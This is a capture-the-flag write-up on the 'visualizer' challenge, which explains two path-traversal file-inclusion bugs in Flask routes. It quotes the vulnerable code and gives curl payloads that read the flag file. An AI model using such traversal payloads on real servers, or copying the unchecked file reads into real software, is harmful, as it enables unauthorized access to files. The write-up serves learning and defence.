visualizer Writeup
===========

# Abstract
There were two file inclusion vulnerabilities on `/login` and `/get` pages.

I found `/get` page vulnerability first. So I got a flag from server during the CTF.

And I found `/login` page vulnerability while check visualizer code for writeups.

## File inclusion vulnerability on `/login` page
### Describe
There are file inclusion vulnerability on `/login` page when getting github-ID using `GET` method. Server attempt to find public key and check that it's a valid public key. If public key is not valid, then server print out the content of the file.
### Source code
```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if flask.request.method == 'POST':
        # ... omitted ...
        data = file_read(keypath)
        pubkey = gpg.import_keys(data)
        if len(pubkey.fingerprints) == 0:
            return flask.Response('%s is not public key\n%s'%(keypath,data)) # file inclusion vulnerability
```

### Payload
`curl http://visualizer.teamx/login?id=../../../../../../../../../../var/ctf/flag`


## File inclusion vulnerability on `/get` page
### Describe
It's a simple page that print out file-content without any name check. Especially there are no login check(`@login_required`) on `/get` page. So I can read the flag without valid user account.
### Source code
```python
@app.route("/get",methods=['GET'])
def static_page():
  if 'page' in flask.request.args:
    page = flask.request.args.get('page')
    path = 'static/' + page
    if os.path.exists(path) and not os.path.isdir(path):
      return file_read(path) # file inclusion vulnerability
```

### Payload
`curl http://visualizer.teamx/get?page=../../../../../../../../../../var/ctf/flag`

# Summary
Check path traversal string(`../`) when getting file name.
